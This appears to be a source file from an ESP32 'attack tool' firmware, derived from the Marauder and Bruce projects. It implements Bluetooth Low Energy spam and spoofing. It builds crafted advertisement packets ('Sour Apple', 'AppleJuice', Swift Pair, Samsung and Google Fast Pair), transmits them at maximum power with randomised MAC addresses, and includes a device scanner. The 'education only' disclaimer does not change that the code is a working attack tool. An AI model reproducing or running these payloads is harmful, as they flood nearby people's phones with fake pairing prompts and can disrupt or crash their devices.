#include "bleheader.h"

/*
    * ble.cpp (Based ESP32 Marauder By @justcallmekoko, Bruce By @pr3y)
    * /!\ WARNING: All Code I Wrote In This Is For Education Purpose ONLY! /!\
    * /!\        I NOT RESPONSIBLE ANY DAMAGE USER CAUSE IN PUBLIC         /!\
    * Author: Shine Nagumo @Ohminecraft (Xun Anh Nguyen)
    * Licensed under the MIT License.
*/

NimBLEAdvertising *pAdvertising;
NimBLEServer *pServer;
NimBLEScan *pBLEScan;


LinkedList<BLEScanResult>* blescanres;

NimBLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
{
    NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();

    uint8_t* AdvData_Raw = nullptr;
    uint8_t i = 0;
    uint8_t dataSize = 0;

    switch (type)
    {
        //ESP32 Sour Apple by RapierXbox
        //Exploit by ECTO-1A
        case SourApple: {
            uint8_t packet[17];
            uint8_t i = 0;
            packet[i++] = 16;   // Packet Length
            packet[i++] = 0xFF; // Packet Type (Manufacturer Specific)
            packet[i++] = 0x4C; // Packet Company ID (Apple, Inc.)
            packet[i++] = 0x00; // ...
            packet[i++] = 0x0F; // Type
            packet[i++] = 0x05; // Length
            packet[i++] = 0xC1; // Action Flags
            const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
            packet[i++] = types[rand() % sizeof(types)]; // Action Type
            esp_fill_random(&packet[i], 3);                // Authentication Tag
            i += 3;
            packet[i++] = 0x00; // ???
            packet[i++] = 0x00; // ???
            packet[i++] = 0x10; // Type ???
            esp_fill_random(&packet[i], 3);
            AdvData.addData(std::string((char *)packet, 17));
            break;
        }

        case AppleJuice: {  // https://github.com/pr3y/Bruce/blob/main/src/modules/ble/ble_spam.cpp
            int randdevice = random(2);
            if (randdevice == 0) {
                uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[rand() % (sizeof(IOS1) / sizeof(IOS1[0]))],
                                      0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                      0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                AdvData.addData(std::string((char *)packet, 31));
            } else if (randdevice == 1) {
                uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
                                      0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[rand() % (sizeof(IOS2) / sizeof(IOS2[0]))],
                                      0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
                                      0x00, 0x00};
                AdvData.addData(std::string((char *)packet, 23));
            }
            break;
        }
        
        case Microsoft: {
            //const char* names[] = {
            //    "Surface Pro", "Surface Book", "Surface Laptop", "Xbox Controller",
            //    "Surface Mouse", "Surface Keyboard", "Windows Phone", "HoloLens"
            //};
            //const char* Name = names[rand() % 8];
            const char *Name = generateRandomName();
            uint8_t name_len = strlen(Name);
            AdvData_Raw = new uint8_t[7 + name_len];
            AdvData_Raw[i++] = 6 + name_len;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x06;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x80;
            memcpy(&AdvData_Raw[i], Name, name_len);
            i += name_len;

            AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
            break;
        }

        case Samsung: {
            uint8_t model = watch_models[random(26)].value;
            uint8_t Samsung_Data[15] = {
                0x0E,
                0xFF,
                0x75,
                0x00,
                0x01,
                0x00,
                0x02,
                0x00,
                0x01,
                0x01,
                0xFF,
                0x00,
                0x00,
                0x43,
                (uint8_t)((model >> 0x00) & 0xFF)
            };
            AdvData.addData(std::string((char *)Samsung_Data, 15));

            break;
        }

        case Google: {
            const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
            uint8_t Google_Data[14] = {
                0x03,
                0x03,
                0x2C,
                0xFE, // First 3 data to announce Fast Pair
                0x06,
                0x16,
                0x2C,
                0xFE,
                (uint8_t)((model >> 0x10) & 0xFF),
                (uint8_t)((model >> 0x08) & 0xFF),
                (uint8_t)((model >> 0x00) & 0xFF), // 6 more data to inform FastPair and device data
                0x02,
                0x0A,
                (uint8_t)((rand() % 120) - 100)
            }; // 2 more data to inform RSSI data.
            AdvData.addData(std::string((char *)Google_Data, 14));
            break;
        }
        
        default: {
            Serial.println("[WARN] Choose Company Type!");
            return AdvData; // Return empty data for default case
        }
    }

    // Clean up allocated memory
    delete[] AdvData_Raw;


    return AdvData;
    //// https://github.com/Spooks4576
}

void BLEModules::main()
{
    blescanres = new LinkedList<BLEScanResult>();
      
    // Initialize NimBLE
    NimBLEDevice::init("");
    pBLEScan = NimBLEDevice::getScan();
    this->ble_initialized = true;
    Serial.println("[INFO] Successfully Initialized BLE Module");

    this->ShutdownBLE();
}

bool BLEModules::ShutdownBLE()
{
    if(this->ble_initialized) {
        Serial.println("[INFO] Shutting down BLE Module");
        pAdvertising->stop();
        pBLEScan->clearResults();
        pBLEScan->stop();
        // Deinitialize NimBLE
        NimBLEDevice::deinit();
        this->ble_initialized = false;
        
        return true;
    }
    return false;
}

void BLEModules::initSpoofer() {
    if (ble_initialized) {
        Serial.println("[INFO] BLE already initialized, skipping...");
        return;
    }
    NimBLEDevice::init("ESP32 Attack Tool - BLE Spoofer");
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    NimBLEServer *pServer = NimBLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();
    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
    esp_ble_gap_set_rand_addr(null_addr);

    ble_initialized = true;
    Serial.println("[INFO] BLE Spoofer Initialized Successfully!");
}

NimBLEAdvertisementData BLEModules::selectSpooferDevices(uint8_t device_type, uint8_t device_brand, uint8_t adv_type) {
    NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();
    if (device_brand == BLE_SPOOFER_DEVICE_BRAND_APPLE) {
        Serial.println("[INFO] BLE Apple Spoofer Starting");
        //uint8_t AdvData_Raw[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[(int)device_type],
        //                           0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
        //                           0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
        //                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        //AdvData.addData(std::string((char*)AdvData_Raw, 31));
        AdvData.addData(std::string((char*)IOS1_1[(int)device_type], 31));
    } else if (device_brand == BLE_SPOOFER_DEVICE_BRAND_SAMSUNG) {
        Serial.println("[INFO] BLE Samsung Spoofer Starting");
        uint8_t model = watch_models[(int)device_type].value;
        uint8_t AdvData_Raw[15] = {0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 
                                   0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
                                   (uint8_t)((model >> 0x00) & 0xFF)};
        AdvData.addData(std::string((char *)AdvData_Raw, 15));
    } else if (device_brand == BLE_SPOOFER_DEVICE_BRAND_GOOGLE) {
        Serial.println("[INFO] BLE Google Spoofer Starting");
        uint32_t model = android_models[(int)device_type].value; // Action Type
        uint8_t AdvData_Raw[14] = {0x03, 0x03, 0x2C, 0xFE, // First 3 data to announce Fast Pair
                                   0x06, 0x16, 0x2C, 0xFE,
                                   (uint8_t)((model >> 0x10) & 0xFF),
                                   (uint8_t)((model >> 0x08) & 0xFF),
                                   (uint8_t)((model >> 0x00) & 0xFF), // 6 more data to inform FastPair and device data
                                   0x02, 0x0A,
                                   (uint8_t)((rand() % 120) - 100)}; // 2 more data to inform RSSI data.
        AdvData.addData(std::string((char *)AdvData_Raw, 14));
    }

    Serial.println("[INFO] BLE Spoofer Device Index: " + (String)device_type);
    String adv_type_str = "";
    
    switch(adv_type) {
        case ADV_MODE_NON:
            pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
            adv_type_str = "NONN";
            break;
        case ADV_MODE_DIR:
            pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_DIR);
            adv_type_str = "DIR";
            break;
        case ADV_MODE_UND:
            pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_UND);
            adv_type_str = "UND";
            break;
    }

    Serial.println("[INFO] BLE Spoofer Ad Type: " + adv_type_str);

    return AdvData;
}

void BLEModules::startSpoofer(uint8_t device_type, uint8_t device_brand, uint8_t adv_type) {
    esp_bd_addr_t dummy_addr = {0x00};
      for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
    }
    NimBLEAdvertisementData oAdvertisementData = selectSpooferDevices(device_type, device_brand, adv_type);
    esp_ble_gap_set_rand_addr(dummy_addr);
    pAdvertising->addServiceUUID(SERVICE_UUID);
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->setMinInterval(0x20); // 32.5ms
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->setMinPreferred(0x20);
    pAdvertising->setMaxPreferred(0x20);
    pAdvertising->start();
    Serial.println("[INFO] Starting Spoofer Advertisement");
}

void BLEModules::stopSpoofer() {
    pAdvertising->stop();
    Serial.println("[INFO] Stopping Spoofer Advertisement");
}

void BLEModules::initSpam() {
    //NimBLEDevice::init("ESP32 Attack Tool");
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, MAX_TX_POWER); 
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER); 
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN , MAX_TX_POWER);

    //NimBLEServer *pServer = NimBLEDevice::createServer();
    //pAdvertising = pServer->getAdvertising();

    //esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
    //esp_ble_gap_set_rand_addr(null_addr);

    ble_initialized = true;
    Serial.println("[INFO] BLE Spam Initialized Successfully!");
}


void BLEModules::executeAppleSpam(EBLEPayloadType apple_mode)
{
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);
    NimBLEDevice::init("ESP32 Attack Tool - BLE Apple Spam");
    NimBLEServer *pServer = NimBLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();
    vTaskDelay(40 / portTICK_PERIOD_MS);
    NimBLEAdvertisementData advertisementData;
    if (apple_mode == AppleJuice) advertisementData = this->GetAdvertismentData(AppleJuice);
    else advertisementData = this->GetAdvertismentData(SourApple);
    pAdvertising->addServiceUUID(SERVICE_UUID);
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    vTaskDelay(20 / portTICK_PERIOD_MS);
    pAdvertising->stop();
    NimBLEDevice::deinit();
}

void BLEModules::executeSwiftpair(EBLEPayloadType type)
{
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);
    NimBLEDevice::init("ESP32 Attack Tool - BLE Swiftpair");
    NimBLEServer *pServer = NimBLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();
    NimBLEAdvertisementData advertisementData = GetAdvertismentData(type);
    pAdvertising->addServiceUUID(SERVICE_UUID);
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    vTaskDelay(10 / portTICK_PERIOD_MS);
    pAdvertising->stop();
    NimBLEDevice::deinit();
}

class AdvertisedDeviceCallbacks: public NimBLEAdvertisedDeviceCallbacks {
    void onResult(NimBLEAdvertisedDevice *advertisedDevice) {
        BLEScanResult bleres;
        String ble_name;
        ble_name = advertisedDevice->getName().c_str();
        if (ble_name.isEmpty()) bleres.name = "<no name>";
        else bleres.name = ble_name;
        bleres.rssi = advertisedDevice->getRSSI();
        bleres.addr = advertisedDevice->getAddress();
        blescanres->add(bleres);
        Serial.println("[INFO] Added: " + bleres.name + " (Addr: " + String(bleres.addr.toString().c_str()) + ")" + " (RSSI: " + String(bleres.rssi) + ")");
        // Serial.println("\n\nAddress - " + bt_address + "Name-"+ bt_name +"\n\n");
    }
};

void BLEModules::bleScan() {
    delete blescanres;
    blescanres = new LinkedList<BLEScanResult>();
    NimBLEDevice::init("ESP32 Attack Tool - BLE Utility");
    ble_initialized = true;
    pBLEScan = NimBLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new AdvertisedDeviceCallbacks());
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);

    vTaskDelay(100 / portTICK_PERIOD_MS);
    //delay(100);

    Serial.println("[INFO] Starting BLE Scan");
    NimBLEScanResults foundDevices = pBLEScan->start(SCANTIME, false); // Default scan time is 5 seconds
    
    Serial.println("[INFO] BLE Scan Done! Found: " + String(foundDevices.getCount()) + " Devices!");

    this->ShutdownBLE();

    Serial.println("[INFO] BLE Scan completed successfully! Devices in list: " + String(blescanres->size()));
}

